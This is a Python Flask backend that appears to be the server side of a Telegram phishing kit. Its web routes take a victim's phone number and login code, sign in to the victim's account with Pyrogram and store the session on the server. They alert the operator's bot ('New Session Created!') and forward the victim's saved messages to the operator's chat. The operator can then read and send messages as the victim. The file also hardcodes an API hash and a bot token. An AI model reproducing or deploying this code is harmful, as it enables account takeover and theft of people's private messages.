from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
from datetime import datetime
from pathlib import Path
import nest_asyncio

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"  # Get from @userinfobot

active_sessions = {}
SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

# Create a single event loop for the entire app
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_sessions_list():
    sessions = []
    for sid, data in active_sessions.items():
        if 'user_info' in data:
            sessions.append({
                'session_id': sid,
                'phone': data['phone'],
                'name': data['user_info'].get('first_name', ''),
                'username': data['user_info'].get('username', '')
            })
    return sessions

def sessions_keyboard(sessions):
    buttons = []
    for sess in sessions:
        name = sess['name'] or sess['phone']
        username = f" @{sess['username']}" if sess['username'] else ""
        buttons.append([{"text": f"📱 {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
    buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sessions"}])
    return {"inline_keyboard": buttons}

def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📖 Read Messages", "callback_data": "menu_read"}],
            [{"text": "✏️ Send Message", "callback_data": "menu_write"}],
            [{"text": "📂 List Chats", "callback_data": "menu_chats"}],
            [{"text": "🔄 Switch Account", "callback_data": "switch_account"}]
        ]
    }

def chats_keyboard(dialogs):
    buttons = []
    for dialog in dialogs[:10]:
        name = dialog['name'][:30]
        identifier = dialog['identifier']
        buttons.append([{"text": f"💬 {name}", "callback_data": f"chat_read_{identifier}"}])
    buttons.append([{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}])
    return {"inline_keyboard": buttons}

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        print(f"Webhook received: {data}")
        
        if 'message' in data:
            msg = data['message']
            chat_id = msg['chat']['id']
            text = msg.get('text', '')
            
            if text == '/start':
                sessions = get_sessions_list()
                if sessions:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nNo active sessions.\n\nLogin via web first.")
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': True})

@app.route('/bot-read-messages', methods=['GET'])
def bot_read_messages():
    try:
        # Get any active session from your server
        if not active_sessions:
            return jsonify({'error': 'No active sessions found'})
        
        # Get the first available session
        session_id = list(active_sessions.keys())[0]
        session_data = active_sessions[session_id]
        client = session_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def fetch():
            messages = []
            async for msg in client.get_chat_history("me", limit=10):
                if msg.text:
                    messages.append(msg.text)
            return messages
        
        messages = loop.run_until_complete(fetch())
        
        # Send messages to YOUR BOT
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        for msg in messages[:5]:
            requests.post(url, json={
                'chat_id': YOUR_CHAT_ID,
                'text': f"📖 {msg[:200]}"
            })
        
        return jsonify({'success': True, 'messages_sent': len(messages)})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        session_id = secrets.token_hex(8)
        
        async def create_and_store_session():
            client = None
            try:
                session_file = SESSIONS_DIR / f"{session_id}"
                client = Client(
                    name=str(session_file),
                    api_id=API_ID,
                    api_hash=API_HASH,
                    workdir=str(Path.cwd()),
                    in_memory=False
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                active_sessions[session_id] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'session_file': str(session_file),
                    'created_at': datetime.now().timestamp()
                }
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'message': 'Code sent to your Telegram'
                }
                
            except Exception as e:
                if client:
                    await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        # Run in the existing event loop
        result = loop.run_until_complete(create_and_store_session())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        async def complete_login():
            try:
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                
                me = await client.get_me()
                
                session_data['user_info'] = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username
                }
                
                # Notify via bot
                send_telegram_message(YOUR_CHAT_ID,
                    f"✅ *New Session Created!*\n\n"
                    f"📱 {me.first_name} (@{me.username})\n"
                    f"🔢 {phone}\n\n"
                    f"Use /start on your bot to control"
                )
                
                return {
                    'success': True,
                    'message': f'Logged in as {me.first_name}',
                    'session_id': session_id,
                    'user': {
                        'id': me.id,
                        'first_name': me.first_name,
                        'username': me.username
                    }
                }
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(complete_login())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(active_sessions)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
